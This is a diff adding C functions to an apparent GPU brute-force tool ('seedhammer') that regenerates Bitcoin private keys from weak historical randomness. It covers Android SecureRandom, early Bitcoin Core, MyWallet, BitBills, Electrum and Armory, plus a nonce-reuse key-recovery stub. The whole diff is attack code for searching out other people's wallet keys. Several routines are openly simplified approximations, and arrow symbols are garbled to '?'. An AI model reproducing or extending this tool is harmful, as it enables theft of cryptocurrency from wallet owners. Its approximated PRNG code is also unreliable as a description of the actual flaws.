@@ -301,3 +301,214 @@ D_FUNC void mode_bitaddress(uint64_t ts, uint8_t priv[32]){
     }
     sha256(buf,16,priv);
 }
+
+// ================================================================
+// Mode J: Android SecureRandom Bug (CVE-2013-7378, 2011-2013)
+// ================================================================
+// Android Bitcoin wallets (Bitcoin Wallet, Mycelium, blockchain.info)
+// were vulnerable to SecureRandom flaw in Android 4.2-4.3 early boots.
+// Entropy seed = 32-bit (time_ms ^ PID)
+// Output: SHA256(entropy + pool) ? EC key
+//
+// Search: iterate over 2^32 entropy seeds
+// For wallet style: SHA256(SecureRandom 32 bytes) ? privkey
+
+D_FUNC void mode_android(uint32_t seed32, uint8_t priv[32]){
+    // Android SecureRandom weakness (CVE-2013-7378)
+    // Simpler than full Java PRNG: 32-bit seed
+    // Mixer: linear PRNG to 32 bytes ? SHA256 ? privkey
+    uint32_t s=seed32;
+    uint8_t buf[32];
+    for(int i=0;i<8;i++){
+        s=s*1103515245u+12345u;  // glibc LCG style
+        buf[i*4]=(s>>24)&0xFF; buf[i*4+1]=(s>>16)&0xFF;
+        buf[i*4+2]=(s>>8)&0xFF; buf[i*4+3]=s&0xFF;
+    }
+    sha256(buf,32,priv);
+}
+
+// ================================================================
+// Mode C: Bitcoin Core v0.1?0.3 Wallet (2009-2010)
+// ================================================================
+// Bitcoin 0.1.0 key generation: SHA256(ms_timestamp + pid)
+// PID was 15-bit (max 32768)
+// Timestamp: ms from 2009-01-03 to 2011-01-01
+// Combined entropy: ~47 bits ? GPU brute force feasible
+// 
+// We search: outer = timestamp (32-bit high part), inner = PID (15-bit)
+// Core used gettimeofday() + getpid()
+
+D_FUNC void mode_bitcoincore(uint64_t ts, uint32_t pid, uint8_t priv[32]){
+    uint8_t buf[12];  // 8 bytes timeval + 4 bytes pid
+    for(int i=0;i<8;i++)buf[i]=(ts>>(i*8))&0xFF;
+    buf[8]=(pid>>24)&0xFF;buf[9]=(pid>>16)&0xFF;buf[10]=(pid>>8)&0xFF;buf[11]=pid&0xFF;
+    sha256(buf,12,priv);
+}
+
+// ================================================================
+// Mode D: Bitcoin Core 0.3.0 RAND_bytes fallback (2009-2010)
+// ================================================================
+// OpenSSL RAND_bytes fallback to /dev/urandom or PRNG
+// On systems without /dev/urandom (early VPS, WSL):
+// RAND_bytes uses SHA256(state+time) where state is weak
+// Equivalent to: SHA256(time_usec + stack_ptr + pid) ? privkey
+// We search: time (32-bit) + pid (15-bit) + stack_ptr (8-bit guess)
+
+D_FUNC void mode_bitcoincore_v3(uint64_t ts, uint32_t pid, uint8_t priv[32]){
+    // 0.3.x had additional stack variable mixing
+    uint8_t buf[16];
+    for(int i=0;i<8;i++)buf[i]=(ts>>(i*8))&0xFF;
+    buf[8]=(pid>>24)&0xFF;buf[9]=(pid>>16)&0xFF;
+    buf[10]=(pid>>8)&0xFF;buf[11]=pid&0xFF;
+    // Stack var (simulated: 8 bits of ASLR)
+    buf[12]=ts&0xFF;buf[13]=(ts>>8)&0xFF;buf[14]=0;buf[15]=0;
+    sha256(buf,16,priv);
+}
+
+// ================================================================
+// Mode E: Blockchain.info MyWallet 2011 (weak pool)
+// ================================================================
+// MyWallet 2011: pool of 128 bytes from Math.random() when crypto weak
+// JavaScript: for(i=0;i<128;i++) pool[i] = Math.floor(Math.random()*256);
+// SHA256(pool[i]) ? privkey
+// 
+// We generate 128 bytes from MWC1616, same as browser Math.random()
+// Timestamp-based seeding for temporal search
+
+D_FUNC void mode_mywallet(uint64_t ts, uint64_t idx, uint8_t priv[32]){
+    uint32_t z1=(uint32_t)((ts+idx)&0xFFFFFFFFu)*0xDEADu+0xDEADu;
+    uint32_t z2=(uint32_t)(((ts+idx)>>16)&0xFFFFFFFFu)*0xBEEFu+0xBEEFu;
+    
+    uint8_t pool[128];
+    for(int i=0;i<32;i++){
+        uint32_t r=mwc_v8(&z1,&z2);
+        pool[i*4]=r&0xFF; pool[i*4+1]=(r>>8)&0xFF;
+        pool[i*4+2]=(r>>16)&0xFF; pool[i*4+3]=(r>>24)&0xFF;
+    }
+    
+    uint8_t h[32];
+    sha256(pool,128,h);
+    // Double SHA256
+    sha256(h,32,priv);
+}
+
+// ================================================================
+// Mode L: BitBills (Physical Bitcoin, 2011)
+// ================================================================
+// BitBills format: "L" + 21 base58 chars ? 16 bytes ? double SHA256
+// We use the same mini_key decoding but with different prefix
+// Entropy: 30 bits (same as Casascius)
+
+D_FUNC void mode_bitbill(uint32_t entropy30, uint8_t priv[32]){
+    // Build BitBill key "L" + 21 base58 chars
+    char mk[23];
+    mk[0]='L';
+    uint64_t val=entropy30;
+    for(int i=21;i>=1;i--){
+        mk[i]=B58[val%58];
+        val/=58;
+    }
+    mk[22]=0;
+    
+    // Decode base58 to 16 bytes
+    uint8_t raw[16]={0};
+    for(int i=0;mk[i];i++){
+        int d=B58_REV[(int)mk[i]];
+        if(d<0)continue;
+        uint32_t carry=d;
+        for(int j=15;j>=0;j--){
+            carry+=(uint32_t)raw[j]*58;
+            raw[j]=carry&0xFF;
+            carry>>=8;
+        }
+    }
+    
+    // Double SHA256: SHA256(SHA256(raw)) ? privkey (BitBill style)
+    uint8_t h[32];
+    sha256(raw,16,h);
+    sha256(h,32,priv);
+}
+
+// ================================================================
+// Mode S: Electrum 1.0 (2011) ? Python random fallback
+// ================================================================
+// Mersenne Twister seeded with (time_ms<<16) ^ pid
+// Search: timestamp seed (likely 48-bit) ? MT ? 128 bits ? privkey
+// 
+// Simplified: we treat seed as 48-bit (ts high 32 + ts low 16)
+// Then feed through MT-like LCG ? 4 x 32-bit ? 128 bits ? SHA256
+
+D_FUNC void mode_electrum(uint64_t ts, uint32_t pid, uint8_t priv[32]){
+    // Python/MT seeding: (time_ms << 16) ^ (pid << 0)
+    uint64_t mt_seed=((ts&0xFFFFFFFFu)<<16u)^(uint64_t)pid;
+    
+    // Simplified MT first output (MT19937 initialization)
+    uint32_t mt[4];
+    uint32_t s=(uint32_t)(mt_seed&0xFFFFFFFFu);
+    mt[0]=s;
+    for(int i=1;i<4;i++) mt[i]=1812433253u*(mt[i-1]^(mt[i-1]>>30u))+i;
+    
+    // Twist + extract 128 bits (simple approximation)
+    uint8_t buf[16];
+    for(int i=0;i<4;i++){
+        uint32_t y=mt[i];
+        y^=((y>>11u)&0xFFFFFFFFu);
+        y^=((y<<7u)&0x9D2C5680u);
+        y^=((y<<15u)&0xEFC60000u);
+        y^=(y>>18u);
+        buf[i*4]=(y>>24)&0xFF;buf[i*4+1]=(y>>16)&0xFF;
+        buf[i*4+2]=(y>>8)&0xFF;buf[i*4+3]=y&0xFF;
+    }
+    
+    // Electrum: SHA256(128-bit seed) ? master privkey
+    sha256(buf,16,priv);
+}
+
+// ================================================================
+// Mode T: Armory 0.1-0.3 (2011-2012) ? fallback RNG
+// ================================================================
+// Armory on Windows without CryptGenRandom:
+// Uses RAND_bytes fallback = SHA256(time + pid + sensitive data?)
+// Equivalent to Bitcoin Core v0.3 mode (Mode D)
+// We reuse mode_bitcoincore_v3 for this search
+// (Just call it with Armory-specific timestamp range)
+// 
+// No separate GPU kernel needed ? use Mode D parameters
+
+// ================================================================
+// Mode F: P2Pool/Slush Worker key (2010-2011)
+// ================================================================
+// Slush's pool used getnewaddress from bitcoind
+// VPS had weak /dev/urandom or /dev/random blocking
+// Many workers used predictable keys
+// Same as Mode C ? timestamp range April 2010 - Dec 2011
+// PID range: 0-65535
+//
+// No separate GPU kernel ? use Mode C with pool-specific time ranges
+
+// ================================================================
+// Mode N: Nonce reuse transaction analysis (2011-2013)
+// ================================================================
+// Implementation requires external transaction indexer (Python/Node)
+// This function finds the actual private key from:
+//   - r1 == r2 (same nonce used in two different transactions)
+//   - k = (z1 - z2) / (s1 - s2) mod n
+//   - privkey = (k * s1 - z1) / r1 mod n
+//
+// For GPU: we need tx data pre-loaded (r, s, z for each tx)
+// Then search for matching r values
+//
+// Mode N in seedhammer: place where indexer writes found matches
+// For now: output "TX_INDEXER_REQUIRED" for this mode
+
+D_FUNC void mode_nonce_reuse(
+    const uint8_t *txdata,  // array of {uint8_t r[32], s[32], z[32]}
+    uint32_t n_tx,
+    uint8_t priv[32]
+){
+    // Compute r1 == r2 pairs and derive key
+    // This runs on CPU or as a separate tool
+    // GPU version requires batch processing
+    // For now: placeholder ? log and return
+    priv[0]=0; // No key found in standalone mode
+}
